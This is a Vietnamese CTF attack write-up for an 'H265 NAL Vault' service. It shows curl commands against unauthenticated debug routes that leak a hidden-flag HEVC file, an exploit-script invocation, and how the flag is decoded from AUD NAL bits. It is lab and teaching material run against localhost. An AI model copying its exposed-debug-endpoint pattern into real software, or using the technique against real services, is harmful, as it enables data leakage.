# H265 NAL Vault AD - Writeup Attack

## 1. Tóm tắt lỗi

Service lưu flag vào raw HEVC Annex-B bitstream. API đọc hợp lệ `/api/read` có
kiểm tra `token`, nhưng service lại để lộ hai route debug:

```text
/api/debug/list
/api/debug/file/<filename>
```

Hai route này không cần token. Vì flag nằm trong chính carrier `.h265`, attacker
chỉ cần tải file về, tách NAL type 35 và đọc kênh AUD là lấy được flag.

## 2. Kiểm tra service

Chạy service:

```bash
cd service
docker compose up --build
```

Kiểm tra health:

```bash
curl http://127.0.0.1:8000/health
```

Kết quả hợp lệ:

```json
{"ok":true}
```

Khi nộp theo form, nên chụp màn hình bước này để chứng minh service đang chạy.

## 3. Đặt flag mẫu vào service

Dùng checker mode `put`:

```bash
python checker/checker.py put 127.0.0.1 8000 'blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}'
```

Checker sẽ in ra `flag_id` dạng JSON, ví dụ:

```json
{"id":"flag_1710000000_abcd1234","token":"..."}
```

Đọc lại bằng mode `get`:

```bash
python checker/checker.py get 127.0.0.1 8000 '{"id":"flag_1710000000_abcd1234","token":"..."}' 'blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}'
```

## 4. Khai thác debug endpoint

Liệt kê file debug:

```bash
curl http://127.0.0.1:8000/api/debug/list
```

Nếu service còn lỗi, server trả về danh sách carrier:

```json
{"files":["flag_1710000000_abcd1234.h265"],"ok":true}
```

Tải carrier:

```bash
curl -o leaked.h265 http://127.0.0.1:8000/api/debug/file/flag_1710000000_abcd1234.h265
```

Script attack có sẵn:

```bash
python solution/exploit.py http://127.0.0.1:8000
```

Output:

```text
blockChainPTIT{4ud_n4l_d3bug_l34k_br34ks_h265_v4ult}
```

Khi nộp theo form, nên chụp màn hình các lệnh `/api/debug/list`, tải carrier
`.h265`, và output của exploit.

## 5. Phân tích kênh H.265

Raw HEVC Annex-B được tách theo start code:

```text
00 00 01
00 00 00 01
```

Trong HEVC, `nal_unit_type` nằm trong header byte đầu:

```python
nal_unit_type = (nal[0] >> 1) & 0x3f
```

Service dùng AUD NAL:

```text
nal_unit_type = 35
```

Byte RBSP đầu của AUD chứa `primary_pic_type` ở 3 bit cao. Bit ẩn được lấy như
sau:

```python
primary_pic_type = (nal[2] >> 5) & 0x07
hidden_bit = primary_pic_type & 1
```

Các bit được ghép MSB-first thành packet:

```text
H5AD || 2-byte length || flag || crc32(flag)
```

CRC32 giúp loại bỏ bitstream sai hoặc không phải carrier của bài.

## 6. Ảnh chụp nên có cho phần attack

Đặt ảnh vào `solution/screenshots/` nếu cần nộp kèm:

- `attack-01-service-health.png`: service chạy và `/health` trả về `ok`.
- `attack-02-debug-list.png`: `/api/debug/list` làm lộ file `.h265`.
- `attack-03-exploit-flag.png`: `solution/exploit.py` hoặc checker exploit in ra flag.
